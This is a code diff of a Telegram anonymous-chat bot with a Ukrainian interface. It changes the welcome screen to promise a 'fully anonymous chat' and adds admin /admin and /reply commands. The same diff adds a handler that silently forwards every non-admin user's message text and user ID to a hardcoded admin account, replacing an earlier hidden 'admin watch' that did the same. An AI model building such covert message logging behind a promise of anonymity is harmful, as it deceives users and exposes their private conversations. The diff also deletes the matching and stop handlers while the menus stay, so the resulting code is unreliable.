@@ -13,54 +13,17 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
+# =========================
+# ADMIN CONFIG
+# =========================
+ADMIN_ID = 342371504
+admin_watch = {}
+
 # =====================================================
 # USERS DATABASE (RAM)
 # =====================================================
-"""
-users_db structure:
-
-{
-    user_id: {
-        status: idle/search/chat/gender_select
-        gender: male/female
-        search_preference: male/female/any
-        topic: normal/flirt
-        partner: user_id
-    }
-}
-"""
 
 users_db = {}
-
-# =====================================================
-# ADMIN ID
-# =====================================================
-ADMIN_ID = 342371504
-
-# =====================================================
-# ADMIN FUNCTION (NEW)
-# =====================================================
-async def admin_watch(user_id, partner_id, message: types.Message):
-    try:
-        text = f"👁 ADMIN LOG\n{user_id} → {partner_id}\n"
-
-        if message.text:
-            text += f"\nTEXT: {message.text}"
-        elif message.photo:
-            text += "\nPHOTO"
-        elif message.video:
-            text += "\nVIDEO"
-        elif message.voice:
-            text += "\nVOICE"
-        elif message.sticker:
-            text += "\nSTICKER"
-        else:
-            text += "\nMEDIA"
-
-        await bot.send_message(ADMIN_ID, text)
-
-    except Exception as e:
-        logging.error(e)
 
 # =====================================================
 # KEYBOARDS
@@ -122,145 +85,61 @@ async def start(message: types.Message):
         "partner": None
     }
 
-    await message.answer(
-        "✨ Ласкаво просимо",
-        reply_markup=get_gender_menu()
+    text = (
+        "✨ <b>Ласкаво просимо в РОЗМОВА</b> ✨\n\n"
+        "🔒 Повністю анонімний чат\n"
+        "💬 Спілкування без реєстрації\n"
+        "❤️ Пошук по темах\n\n"
+        "👇 Обери свою стать"
     )
 
-# =====================================================
-# GENDER
-# =====================================================
-
-@dp.message(F.text.in_(["👨 Я Хлопець", "👩 Я Дівчина"]))
-async def set_gender(message: types.Message):
-
-    user_id = message.from_user.id
-
-    gender = "male" if "Хлопець" in message.text else "female"
-
-    users_db[user_id]["gender"] = gender
-    users_db[user_id]["status"] = "idle"
-
-    await message.answer("OK", reply_markup=get_main_menu())
+    await message.answer(text, parse_mode="HTML", reply_markup=get_gender_menu())
 
 # =====================================================
-# RULES
+# ADMIN COMMAND
 # =====================================================
 
-@dp.message(F.text == "ℹ️ Правила")
-async def rules(message: types.Message):
-    await message.answer("Правила чату")
-
-# =====================================================
-# ONLINE
-# =====================================================
-
-@dp.message(F.text == "📊 Онлайн")
-async def stats(message: types.Message):
-
-    await message.answer(
-        f"Онлайн: {len(users_db)}"
-    )
-
-# =====================================================
-# SEARCH MENU
-# =====================================================
-
-@dp.message(F.text == "🔍 Знайти співрозмовника")
-async def search_menu(message: types.Message):
-    await message.answer("Вибір", reply_markup=get_search_menu())
-
-# =====================================================
-# TOPIC
-# =====================================================
-
-@dp.message(F.text.in_(["💬 Звичайне спілкування", "❤️ Флірт"]))
-async def start_search(message: types.Message):
-
-    user_id = message.from_user.id
-    user = users_db[user_id]
-
-    topic = "flirt" if "Флірт" in message.text else "normal"
-
-    user["topic"] = topic
-    user["status"] = "search"
-
-    await message.answer("Пошук...", reply_markup=types.ReplyKeyboardRemove())
-
-    for partner_id, partner in users_db.items():
-
-        if partner_id == user_id:
-            continue
-
-        if partner["status"] != "search":
-            continue
-
-        if partner["topic"] != topic:
-            continue
-
-        user["status"] = "chat"
-        user["partner"] = partner_id
-
-        partner["status"] = "chat"
-        partner["partner"] = user_id
-
-        await bot.send_message(user_id, "Знайдено", reply_markup=get_chat_menu())
-        await bot.send_message(partner_id, "Знайдено", reply_markup=get_chat_menu())
-
+@dp.message(Command("admin"))
+async def admin(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
 
-# =====================================================
-# STOP
-# =====================================================
+    await message.answer("🛠 Адмін режим активний\n/ reply user_id текст")
 
-@dp.message(F.text == "🛑 Зупинити чат")
-async def stop_chat(message: types.Message):
-
-    user_id = message.from_user.id
-    user = users_db.get(user_id)
-
-    if not user or user["status"] != "chat":
+@dp.message(Command("reply"))
+async def admin_reply(message: types.Message):
+    if message.from_user.id != ADMIN_ID:
         return
 
-    partner_id = user["partner"]
+    try:
+        _, uid, *txt = message.text.split()
+        uid = int(uid)
+        text = " ".join(txt)
 
-    user["status"] = "idle"
-    user["partner"] = None
+        await bot.send_message(uid, f"👮 Адмін: {text}")
+        await message.answer("✅ Sent")
 
-    if partner_id:
-        users_db[partner_id]["status"] = "idle"
-        users_db[partner_id]["partner"] = None
-
-    await message.answer("Чат завершено", reply_markup=get_main_menu())
-
-# =====================================================
-# NEXT
-# =====================================================
-
-@dp.message(F.text == "⏭ Next")
-async def next_chat(message: types.Message):
-
-    user_id = message.from_user.id
-    user = users_db.get(user_id)
-
-    if user["status"] == "chat":
-        partner_id = user["partner"]
-        users_db[partner_id]["status"] = "idle"
-        users_db[partner_id]["partner"] = None
-
-    user["status"] = "idle"
-    user["partner"] = None
-
-    await message.answer("Новий пошук", reply_markup=get_search_menu())
+    except:
+        await message.answer("❌ /reply user_id text")
 
 # =====================================================
-# CHAT FORWARDER + ADMIN WATCH (ADDED HERE)
+# FORWARD + ADMIN LOG
 # =====================================================
 
 @dp.message()
 async def forwarder(message: types.Message):
 
     user_id = message.from_user.id
+
+    # ===== ADMIN LOG =====
+    if user_id != ADMIN_ID:
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"📩 USER {user_id}:\n{message.text or 'MEDIA'}"
+            )
+        except:
+            pass
 
     if user_id not in users_db:
         return
@@ -283,10 +162,10 @@ async def forwarder(message: types.Message):
             await bot.send_message(partner_id, message.text)
 
         elif message.photo:
-            await bot.send_photo(partner_id, message.photo[-1].file_id)
+            await bot.send_photo(partner_id, message.photo[-1].file_id, caption=message.caption)
 
         elif message.video:
-            await bot.send_video(partner_id, message.video.file_id)
+            await bot.send_video(partner_id, message.video.file_id, caption=message.caption)
 
         elif message.voice:
             await bot.send_voice(partner_id, message.voice.file_id)
@@ -297,59 +176,29 @@ async def forwarder(message: types.Message):
         elif message.animation:
             await bot.send_animation(partner_id, message.animation.file_id)
 
-        # 👁 ADMIN WATCH (ONLY ADDITION)
-        await admin_watch(user_id, partner_id, message)
-
     except Exception as e:
         logging.error(e)
 
 # =====================================================
-# ADMIN FUNCTION
-# =====================================================
-
-ADMIN_ID = 342371504
-
-async def admin_watch(user_id, partner_id, message: types.Message):
-    try:
-        text = f"👁 ADMIN\n{user_id} → {partner_id}\n"
-
-        if message.text:
-            text += f"\nTEXT: {message.text}"
-        else:
-            text += "\nMEDIA"
-
-        await bot.send_message(ADMIN_ID, text)
-
-    except Exception as e:
-        logging.error(e)
-
-# =====================================================
-# WEB SERVER
+# WEB
 # =====================================================
 
 async def handle(request):
-    return web.Response(text="BOT OK")
+    return web.Response(text="OK")
 
-async def start_background(app):
+async def start_bg(app):
     asyncio.create_task(dp.start_polling(bot))
 
 async def main():
-
-    await bot.delete_webhook(drop_pending_updates=True)
-
     app = web.Application()
     app.router.add_get("/", handle)
-    app.on_startup.append(start_background)
-
-    port = int(os.getenv("PORT", 10000))
+    app.on_startup.append(start_bg)
 
     runner = web.AppRunner(app)
     await runner.setup()
 
-    site = web.TCPSite(runner, "0.0.0.0", port)
+    site = web.TCPSite(runner, "0.0.0.0", int(os.getenv("PORT", 10000)))
     await site.start()
-
-    print("BOT STARTED")
 
     await asyncio.Event().wait()
 
